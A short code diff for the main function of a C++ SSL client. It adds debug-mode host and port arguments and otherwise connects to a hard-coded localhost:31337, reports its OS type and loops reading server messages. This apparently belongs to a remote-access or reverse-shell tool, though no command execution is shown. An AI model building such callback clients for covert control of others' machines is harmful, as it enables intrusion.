@@ -2,7 +2,15 @@
 #include "Client.hpp"
 #include "Misc.hpp"
 
+#ifdef _DEBUG
+int main(int argc ,char **argv){
+	if(argc != 3){
+		std::cout<<"Use "<<argv[0]<<" host port\n";
+		return 0;
+	}
+#else
 int main(){
+#endif
 	signal(SIGPIPE, SIG_IGN);
 	SSL_library_init();
 	OpenSSL_add_all_algorithms();
@@ -12,11 +20,13 @@ int main(){
 	Client *Cli = new Client;
 	char *cBuffer = new char[1024];
 	while(Cli->isKeepRunning){
-		if(Cli->Connect("127.0.0.1", "31337")){
-			#ifdef _DEBUG
+		#ifdef _DEBUG
+		if(Cli->Connect(argv[1], argv[2])){
 			std::cout<<"Connected!!!\n";
-			#endif
-			if(SSL_write(Cli->sslSocket, "01", 2) > 0){ //01 linux 00 windows
+		#else
+		if(Cli->Connect("127.0.0.1", "31337")){	
+		#endif
+			if(SSL_write(Cli->sslSocket, "01", 2) > 0){
 				while(1){
 					int iBytes = SSL_read(Cli->sslSocket, cBuffer, 1023);
 					if(iBytes > 2){
